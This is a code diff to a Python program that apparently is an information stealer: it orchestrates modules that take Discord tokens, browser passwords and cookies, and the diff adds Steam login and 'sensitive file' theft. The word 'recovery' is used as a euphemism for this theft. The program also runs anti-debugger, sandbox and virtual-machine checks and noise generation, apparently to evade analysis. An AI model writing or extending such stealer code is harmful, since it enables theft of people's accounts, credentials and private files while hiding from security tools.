@@ -8,6 +8,8 @@ from typing import List
 from Cores.Cookies import CookieRecovery
 from Cores.Discord import DiscordTokenRecovery
 from Cores.Browser import BrowserPasswordRecovery
+from Cores.Steam import SteamLoginRecovery
+from Cores.Files import FileRecovery
 from Utilities.MemoryManager import MemoryHandler
 from Protections.Debugger import AntiDebugger
 from Protections.System import SystemChecks
@@ -60,7 +62,7 @@ class Recovery:
     async def recover_all(self):
         logging.info("Starting recovery process...")
         for recovery_module in self.recovery_modules:
-            methods_to_try = ["recover", "extract_tokens", "recover_data", "extract_all_browser_data"]
+            methods_to_try = ["recover", "extract_tokens", "recover_data", "extract_all_browser_data", "save_steam_login", "recover_sensitive_files"]
             method_found = False
             for method_name in methods_to_try:
                 if hasattr(recovery_module, method_name):
@@ -119,7 +121,7 @@ async def main(memory_handler: MemoryHandler, task_manager: TaskManager):
 
 if __name__ == "__main__":
     checks = Checks(AntiDebugger(), SystemChecks(), ForbiddenProcessCheck(), BIOSVersionChecker(), PseudoDevices(), NestedVirtualizationChecker(), WindowsSandboxChecker())
-    recovery = Recovery(DiscordTokenRecovery(), CookieRecovery(), BrowserPasswordRecovery())
+    recovery = Recovery(DiscordTokenRecovery(), SteamLoginRecovery(), FileRecovery(), CookieRecovery(), BrowserPasswordRecovery())
     noise_methods = [
         NoiseGenerator.create_noise, 
         NoiseGenerator.create_alternate_noise, 
